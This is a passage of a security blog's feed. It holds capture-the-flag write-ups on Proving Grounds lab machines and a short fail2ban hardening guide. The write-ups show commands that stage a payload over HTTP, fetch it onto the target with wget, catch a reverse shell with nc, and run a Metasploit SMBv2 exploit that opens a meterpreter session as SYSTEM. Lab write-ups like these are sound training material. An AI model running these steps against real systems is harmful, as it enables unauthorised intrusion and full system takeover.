&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80 &lt;span class=&quot;c&quot;&gt;# → Create a http server to transfer the payload&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;On the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www-data&lt;/code&gt; shell, we download the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sample.jpg&lt;/code&gt; image utilizing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wget&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;www-data@exfiltrated:/var/www/html/subrion/uploads&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget 192.168.49.63/sample.jpg
Connecting to 192.168.49.63:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4405 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4.3K&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;image/jpeg]
Saving to: ‘sample.jpg’

sample.jpg                                         100%[&lt;span class=&quot;o&quot;&gt;=====================================================================================================================&amp;gt;]&lt;/span&gt;   4.30K  &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;.-KB/s    &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.03s 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It’s important to save the downloaded &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sample.jpg&lt;/code&gt; file inside&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/html/subrion/uploads&lt;/code&gt; directory, then wait …&lt;/p&gt;

&lt;p&gt;After a minute, we should obtain the reverse shell&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 80
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 80 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.49.63] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.63.163] 50058
bash: cannot &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;terminal process group &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;37008&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;device
bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
root@exfiltrated:~# &lt;span class=&quot;nb&quot;&gt;id
id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and become root!.&lt;/p&gt;</content><author><name></name></author><category term="ctf" /><category term="linux" /><category term="pg" /><summary type="html">Summary In this writeup, we’ll exploit the Subrion v4.2.1 CMS to secure the inital foothold. We’ll then escalate our privilege via a crontab service that executes the exploitable exiftool.</summary></entry><entry><title type="html">Fail2Ban - BlueTeam</title><link href="https://jayngng.github.io/blog/fail2ban-blueteam/" rel="alternate" type="text/html" title="Fail2Ban - BlueTeam" /><published>2021-09-07T22:11:05+10:00</published><updated>2021-09-07T22:11:05+10:00</updated><id>https://jayngng.github.io/blog/fail2ban---blueteam</id><content type="html" xml:base="https://jayngng.github.io/blog/fail2ban-blueteam/">&lt;h3 id=&quot;overview-of-fail2ban&quot;&gt;&lt;strong&gt;Overview of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fail2ban&lt;/code&gt;&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fail2ban&lt;/code&gt; application will monitor the abnormalities of intrusion attempts accross multiple services including &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSH&lt;/code&gt;, etc. If an IP address is marked as suspicious, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fail2ban&lt;/code&gt; will block it for a specific duration.&lt;/p&gt;

&lt;p&gt;Primarily, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fail2ban&lt;/code&gt; is an efficient security strategy to protect a server against password bruteforcing attack or dictionary attack. We’ll dive deeper some basic configurations of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fail2ban&lt;/code&gt; in the next sections.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;installing-fail2ban&quot;&gt;&lt;strong&gt;Installing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fail2ban&lt;/code&gt;&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;Let’s us begin with the installation step.&lt;/p&gt;

&lt;p&gt;For &lt;strong&gt;Debian&lt;/strong&gt;, execute the following command.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt-get &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;fail2ban
Reading package lists... Done
Building dependency tree       
Reading state information... Done
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After a few seconds, our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fail2ban&lt;/code&gt; should be ready for further configuring.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;configuring-fail2ban&quot;&gt;&lt;strong&gt;Configuring &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fail2ban&lt;/code&gt;&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;[1]. On the terminal, we execute&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo cp&lt;/span&gt; /etc/fail2ban/jail.conf /etc/fail2ban/jail.local
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jail.local&lt;/code&gt; is a custom &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fail2ban&lt;/code&gt; configuration. In other words, we can adjust the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jail.local&lt;/code&gt; file to suite our purposes and avoid overwriting the default &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fail2ban&lt;/code&gt; configurations.&lt;/p&gt;

&lt;p&gt;[2]. Open the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jail.local&lt;/code&gt; file, there are some useful configuration by default.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;ignoreip&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ignoreip = 127.0.0.1/8 10.10.10.21&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;→ Specified IP addresses won’t be banned by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fail2ban&lt;/code&gt;, separated with a space.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;bantime&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bantime  = 600&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;→ The default ban time is 600 secs (10 mins).&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;maxretry&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;maxretry = 5&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;→ The number of failures before a host get banned.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;findtime&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;findtime = 600&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;→ Used with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;maxretry&lt;/code&gt;, if a host exceeds 5 failed login attempts within 600 seconds, it will be banned.&lt;/p&gt;

&lt;p&gt;It’s worth noticing that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fail2ban&lt;/code&gt; monitors SSH login attempts by default.&lt;/p&gt;

&lt;p&gt;To reconfigure each service, we navigate to that specific service.&lt;/p&gt;

&lt;p&gt;For instance, to rule &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSH&lt;/code&gt;, we navigate to the line 215 of the default &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jail2.local&lt;/code&gt; configuration file, it might looks like the following.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;sshd]

port    &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ssh
logpath &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; %&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;sshd_log&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;s


&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;sshd-ddos]
&lt;span class=&quot;c&quot;&gt;# This jail corresponds to the standard configuration in Fail2ban.&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# The mail-whois action send a notification e-mail with a whois request&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# in the body.&lt;/span&gt;
port    &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ssh
logpath &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; %&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;sshd_log&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;s
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;[3]. Save the file and restart the application to adapt new rules.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;service fail2ban restart
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;[4]. To display the banned IP, we execute:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;iptables &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; fail2ban-SSH &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; 192.168.0.12/24 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; REJECT &lt;span class=&quot;nt&quot;&gt;--reject-with&lt;/span&gt; icmp-port-unreachable
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;reference&quot;&gt;&lt;strong&gt;Reference&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;A2 Hosting:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    https://www.a2hosting.com/kb/security/hardening-a-server-with-fail2ban
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="blueteam" /><category term="fail2ban" /><category term="defense" /><summary type="html">Overview of fail2ban The fail2ban application will monitor the abnormalities of intrusion attempts accross multiple services including HTTP, SSH, etc. If an IP address is marked as suspicious, fail2ban will block it for a specific duration.</summary></entry><entry><title type="html">Internal - OSPG</title><link href="https://jayngng.github.io/blog/internal-ospg/" rel="alternate" type="text/html" title="Internal - OSPG" /><published>2021-09-06T07:07:02+10:00</published><updated>2021-09-06T07:07:02+10:00</updated><id>https://jayngng.github.io/blog/internal---ospg</id><content type="html" xml:base="https://jayngng.github.io/blog/internal-ospg/">&lt;h1 id=&quot;summary&quot;&gt;&lt;strong&gt;Summary&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;In this writeup, we’ll exploit the vulnerable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SMB&lt;/code&gt; service, which yields us &lt;strong&gt;Unauthenticated Remote Code Execution&lt;/strong&gt; and successfully compromise the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYSTEM&lt;/code&gt; access.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;enumeration&quot;&gt;&lt;strong&gt;Enumeration&lt;/strong&gt;&lt;/h1&gt;

&lt;h4 id=&quot;nmap&quot;&gt;&lt;strong&gt;Nmap&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;We’ll begin with a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; 192.168.130.40
PORT      STATE    SERVICE            VERSION
53/tcp    open     domain             Microsoft DNS 6.0.6001 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;17714650&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Windows Server 2008 SP1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
135/tcp   open     msrpc              Microsoft Windows RPC
139/tcp   open     netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds       Microsoft Windows Server 2008 R2 microsoft-ds &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
763/tcp   filtered cycleserv
1147/tcp  filtered capioverlan
3389/tcp  open     ssl/ms-wbt-server?
5357/tcp  open     http               Microsoft HTTPAPI httpd 2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s us further inspecting the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SMB&lt;/code&gt; version by employing a vulnerability scanner against the service.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; smb-vuln&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p445&lt;/span&gt; 192.168.130.40
Starting Nmap 7.80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-09-06 21:14 AEST
Verbosity Increased to 1.
Completed NSE at 21:15, 60.65s elapsed
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.130.40
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.32s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-cve2009-3103: 
|   VULNERABLE:
|   SMBv2 exploit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CVE-2009-3103, Microsoft Security Advisory 975497&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|     State: VULNERABLE
|     IDs:  CVE:CVE-2009-3103
|           Array index error &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the SMBv2 protocol implementation &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;srv2.sys &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;Microsoft Windows Vista Gold, SP1, and SP2,
|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
|           denial of service &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;system crash&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; via an &amp;amp; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ampersand&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; character &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;a Process ID High header field &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;a NEGOTIATE
|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
|           aka &lt;span class=&quot;s2&quot;&gt;&quot;SMBv2 Negotiation Vulnerability.&quot;&lt;/span&gt;
|           
|     Disclosure &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;: 2009-09-08
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;CVE-2009-3103
|_      http://www.cve.mitre.org/cgi-bin/cvename.cgi?name&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;CVE-2009-3103
|_smb-vuln-ms10-054: &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: TIMEOUT
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Conducting a few more researches, we discover the exploit can be found &lt;a href=&quot;https://www.exploit-db.com/exploits/40280&quot;&gt;here&lt;/a&gt; and exploitable via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Metasploit&lt;/code&gt; framework.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;exploitation&quot;&gt;&lt;strong&gt;Exploitation&lt;/strong&gt;&lt;/h1&gt;

&lt;h4 id=&quot;ms09-050-rce&quot;&gt;&lt;strong&gt;MS09-050 RCE&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Within our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Metasploit&lt;/code&gt; console, we &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;search&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;use&lt;/code&gt; the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;windows/smb/ms09_050_smb2_negotiate_func_index&lt;/code&gt; module.&lt;/p&gt;

&lt;p&gt;Here is an example of the module configurations.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf6 exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;windows/smb/ms09_050_smb2_negotiate_func_index&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; options

Module options &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;exploit/windows/smb/ms09_050_smb2_negotiate_func_index&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:

   Name    Current Setting  Required  Description
   &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;    &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
   RHOSTS  192.168.130.40   &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The target host&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT   445              &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The target port &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
   WAIT    180              &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The number of seconds to &lt;span class=&quot;nb&quot;&gt;wait &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the attack to complete.


Payload options &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;windows/meterpreter/reverse_tcp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:

   Name      Current Setting  Required  Description
   &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;      &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
   EXITFUNC  thread           &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;Exit technique &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Accepted: &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;, seh, thread, process, none&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
   LHOST     tun0             &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The listen address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;an interface may be specified&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
   LPORT     4444             &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The listen port


Exploit target:

   Id  Name
   &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
   0   Windows Vista SP1/SP2 and Server 2008 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;x86&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After everything is lined up, we can throw our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exploit&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf6 exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;windows/smb/ms09_050_smb2_negotiate_func_index&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; exploit

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Started reverse TCP handler on 192.168.49.130:4444 
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; 192.168.130.40:445 - Connecting to the target &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;192.168.130.40:445&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; 192.168.130.40:445 - Sending the exploit packet &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;951 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; 192.168.130.40:445 - Waiting up to 180 seconds &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;exploit to trigger...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Sending stage &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;175174 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; to 192.168.130.40
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Meterpreter session 1 opened &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;192.168.49.130:4444 -&amp;gt; 192.168.130.40:49159&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-09-06 21:20:32 +1000

meterpreter &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; shell
Process 3672 created.
Channel 1 created.
Microsoft Windows &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Version 6.0.6001]
Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2006 Microsoft Corporation.  All rights reserved.

C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&amp;gt;whoami
&lt;span class=&quot;nb&quot;&gt;whoami
&lt;/span&gt;nt authority&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Privilege escalation is trivial since we are already &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nt authority\system&lt;/code&gt; on the system!.&lt;/p&gt;</content><author><name></name></author><category term="windows" /><category term="pg" /><category term="ctf" /><summary type="html">Summary In this writeup, we’ll exploit the vulnerable SMB service, which yields us Unauthenticated Remote Code Execution and successfully compromise the SYSTEM access.</summary></entry><entry><title type="html">Wombo - OSPG</title><link href="https://jayngng.github.io/blog/wombo-ospg/" rel="alternate" type="text/html" title="Wombo - OSPG" /><published>2021-09-05T19:22:23+10:00</published><updated>2021-09-05T19:22:23+10:00</updated><id>https://jayngng.github.io/blog/wombo---ospg</id><content type="html" xml:base="https://jayngng.github.io/blog/wombo-ospg/">&lt;h1 id=&quot;summary&quot;&gt;&lt;strong&gt;Summary&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;In this writeup, we’ll exploit the vulnerable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Redis&lt;/code&gt; service to compromise &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; access on the target system.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;enumeration&quot;&gt;&lt;strong&gt;Enumeration&lt;/strong&gt;&lt;/h1&gt;

&lt;h4 id=&quot;nmap&quot;&gt;&lt;strong&gt;Nmap&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;We’ll begin with a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan.&lt;/p&gt;

